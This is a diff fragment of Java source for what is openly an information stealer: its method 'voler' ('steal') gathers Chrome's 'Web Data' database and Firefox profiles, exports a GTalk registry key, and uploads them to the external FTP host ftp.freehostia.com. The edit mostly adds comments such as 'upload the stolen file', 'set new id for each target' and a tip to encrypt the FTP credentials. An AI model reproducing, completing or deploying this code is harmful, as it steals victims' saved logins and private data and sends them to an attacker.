@@ -58,36 +58,33 @@ if(nbr_fich_doss>5)nbr_fich_doss=5;
               //    System.out.println(names[i]);
         }
         
-            
-      
     }
-    
     
     
     return target;
  }
   
-     public static void voler()
+     public static void voler() // this function upload the stolen file to the ftp server
      {
           SimpleFTP ftp = new SimpleFTP();
     
     // Connect to an FTP server on port 21.
   
           try{
-    ftp.connect("ftp.freehostia.com", 21, "user", "pwd");//change this
+    ftp.connect("ftp.freehostia.com", 21, "user", "pwd");//use your own credentials, you could hide these informations by using encryption
  
     // Set binary mode.
     ftp.bin();
-        ftp.cwd("ftp");
+    ftp.cwd("ftp");
  
     // You can also upload from an InputStream, e.g.
-    double f=Math.random();
-        String userName = System.getProperty("user.name");
+    double f=Math.random(); // set new id for each target
+    String userName = System.getProperty("user.name");
 
  String chrome=f+userName+"web ddata";
  File file;
  String c=System.getenv("HOMEDRIVE");//use home drive c or d ...
-
+//chrome database path
   String path_chrom=c+"\\Users\\"+userName+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default";
   
            
@@ -108,11 +105,6 @@ if(nbr_fich_doss>5)nbr_fich_doss=5;
                    Process pr2 = rt.exec("regedit /e "+c+"\\gtk.reg "+gtalk);
                /*****************************************export key*****************************/
 
-   
-   
-  
-    
-    
     
     String[] profiles;
     String path=System.getenv("APPDATA")+"\\Mozilla\\Firefox\\Profiles\\";
@@ -180,17 +172,11 @@ if(registr.exists())
              ftp.stor(new FileInputStream(registr),gtuser);
 
    
-   
-   
-   
-   
-   
-    // Quit from the FTP server.
+    // Quit the FTP server.
     ftp.disconnect();
     }
 catch (IOException e) {
-    // Jibble.
-  //  System.out.println("error"+e);
+   //  System.out.println("error"+e);
 }
      }
    
